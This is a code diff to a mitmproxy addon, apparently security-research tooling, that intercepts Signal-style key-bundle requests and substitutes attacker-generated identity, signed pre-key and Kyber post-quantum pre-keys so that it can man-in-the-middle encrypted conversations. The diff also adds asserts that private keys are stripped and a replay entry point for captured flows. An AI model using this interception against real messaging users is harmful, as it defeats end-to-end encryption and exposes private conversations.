@@ -281,6 +281,9 @@ def _v2_keys(flow: HTTPFlow):
     legit_bundle.on_conflict_replace().execute()
     mitm_bundle.on_conflict_replace().execute()
 
+    # prevent regressions
+    assert "privateKey" not in req['pqPreKeys'][0]
+    assert "privateKey" not in req['preKeys'][0]
     flow.request.content = json.dumps(req).encode()
 
 
@@ -404,15 +407,29 @@ def v2_keys_identifier_device_id(flow, identifier: str, device_id: str):
             "publicKey": identity_key.public_key().to_base64(),
             "privateKey": identity_key.private_key().to_base64()
         }
-        fake_spk = fakeBundle_wire["devices"][0]["signedPreKey"]
-        fake_spk["privateKey"] = b64encode(fakeUser.signed_pre_key_pair.private_key().serialize()).decode("utf-8")
+        target_spk = fakeBundle_wire["devices"][0]["signedPreKey"]
+        fake_spk = {
+            "keyId": target_spk.get("keyId"),
+            "publicKey": target_spk.get("publicKey"),
+            "signature": target_spk.get("signature"),
+            "privateKey": b64encode(fakeUser.signed_pre_key_pair.private_key().serialize()).decode("utf-8")
+        }
+        # fake_spk = fakeBundle_wire["devices"][0]["signedPreKey"]
+        # fake_spk["privateKey"] = b64encode(fakeUser.signed_pre_key_pair.private_key().serialize()).decode("utf-8")
         fake_pre_keys = [{
             "keyId": fakeBundle_wire["devices"][0]["preKey"]["keyId"],
             "publicKey": fakeBundle_wire["devices"][0]["preKey"]["publicKey"],
             "privateKey": fakeUser.pre_key_pair.private_key().to_base64()
         }]
-        fake_kyber = fakeBundle_wire["devices"][0]["pqPreKey"]
-        fake_kyber["privateKey"] = fakeUser.kyber_pre_key_pair.get_private().to_base64()
+        # fake_kyber = fakeBundle_wire["devices"][0]["pqPreKey"]
+        target_kyber = fakeBundle_wire["devices"][0]["pqPreKey"]
+        fake_kyber = {
+            "keyId": target_kyber.get("keyId"),
+            "publicKey": target_kyber.get("publicKey"),
+            "signature": target_kyber.get("signature"),
+            "privateKey": fakeUser.kyber_pre_key_pair.get_private().to_base64()
+        }
+        # fake_kyber["privateKey"] = fakeUser.kyber_pre_key_pair.get_private().to_base64()
         # logging.error()
         mitm_bundle = MitMBundle.insert(
             type=identity.lower(),
@@ -429,6 +446,10 @@ def v2_keys_identifier_device_id(flow, identifier: str, device_id: str):
     resp.update(fakeBundle_wire)
     conversation_session[(ip_address, identifier)] = (fakeVictim, fakeUser)
     logging.warning(f"session {conversation_session}")
+
+    assert "privateKey" not in resp['devices'][0]['pqPreKey']
+    assert "privateKey" not in resp['devices'][0]['signedPreKey']
+    assert "privateKey" not in resp['devices'][0]['pqPreKey']
     flow.response.content = json.dumps(resp, sort_keys=True).encode()
 
 
@@ -660,3 +681,16 @@ def _v1_websocket_resp(flow: HTTPFlow, msg):
 
 
 addons = [api]
+
+from mitmproxy.tools.main import mitmproxy, mitmdump
+
+if __name__ == "__main__":
+    mitmdump(
+        [
+            "-q",      # quiet flag, only script's output
+            "-s",      # script flag
+            __file__,  # use the same file as the hook
+            "-r",
+            "mitmproxy_flows/new/23_04_kyber_messages"
+        ]
+    )
